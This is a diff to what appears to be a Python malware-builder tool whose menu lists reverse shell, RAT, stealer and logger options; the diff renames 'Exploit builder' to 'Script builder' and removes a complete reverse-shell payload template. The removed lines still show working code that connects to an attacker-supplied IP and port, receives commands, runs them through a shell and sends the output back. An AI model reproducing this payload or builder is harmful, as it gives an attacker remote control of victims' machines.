@@ -36,11 +36,11 @@ def build_menu():
                                               |         \
                                               |__________|
 """)
-    current_exploits_available = Text.from_ansi(f"""
-    [{RED}RVSHELL{RESET}]: 1
-    [{RED}RAT{RESET}]: 0
-    [{RED}STEALER{RESET}]: 0
-    [{RED}LOGGER{RESET}]: 0
+    current_scripts_available = Text.from_ansi(f"""
+    [{RED}SHELL{RESET}]: 1
+
+
+
 
 
 
@@ -57,12 +57,12 @@ def build_menu():
                     banner,
                     style="bold red",
                     border_style="bold red",
-                    title="Exploit builder",
+                    title="Script builder",
                 ),
                 Panel(
-                    current_exploits_available,
+                    current_scripts_available,
                     border_style="bold red",
-                    title="Exploits Available",
+                    title="Scripts Available",
                 ),
             ],
             expand=True,
@@ -93,22 +93,8 @@ def os():
 # maybe add functionality for os specific exploits? --deltadude
 def build():
     output = f"""\
-import socket, subprocess, os
-
-HOST = "{IP}"
-PORT = {PORT}
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((HOST, PORT))
-while True:
-    s.send(f"{{os.getcwd()}}>".encode())
-    cmd = s.recv(1024).decode()
-    if cmd.startswith("cd "):
-        os.chdir(cmd.strip("cd ")).strip()
-        continue
-    output = subprocess.run(cmd,shell=True,
-                            capture_output=True)
-    s.send(output.stdout + output.stderr)
+#in progress
+#old script wasnt really good
 
 """
     os.makedirs("output", exist_ok=True)
